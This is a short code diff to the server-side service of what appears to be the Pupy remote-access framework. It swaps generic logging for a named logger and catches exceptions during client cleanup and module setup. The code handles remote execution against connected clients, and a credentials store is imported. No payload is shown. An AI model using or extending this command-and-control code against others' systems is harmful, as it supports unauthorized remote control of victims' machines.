@@ -17,11 +17,13 @@
 import rpyc.core.service
 import rpyc
 import sys
-import logging
 import traceback
 import json
 import zlib
 import msgpack
+
+from . import getLogger
+logger = getLogger('service')
 
 from pupylib.PupyCredentials import Credentials
 
@@ -105,7 +107,10 @@ class PupyService(rpyc.Service):
     def on_disconnect(self):
         self.pupy_srv.remove_client(self)
         for cleanup in self._local_cleanups:
-            cleanup()
+            try:
+                cleanup()
+            except Exception, e:
+                logger.exception(e)
 
     # Compatibility call
     def exposed_set_modules(self, modules):
@@ -116,11 +121,8 @@ class PupyService(rpyc.Service):
 
             try:
                 self.namespace = self._conn.root.namespace
-            except Exception:
-                if logging.getLogger().getEffectiveLevel()==logging.DEBUG:
-                    raise
-                else:
-                    return
+            except Exception, e:
+                logger.exception(e)
 
             self.execute = self._conn.root.execute
             try:
@@ -146,7 +148,7 @@ class PupyService(rpyc.Service):
             self.pupy_srv.add_client(self)
 
         except Exception:
-            logging.error(traceback.format_exc())
+            logger.error(traceback.format_exc())
             try:
                 self._conn.close()
             except:
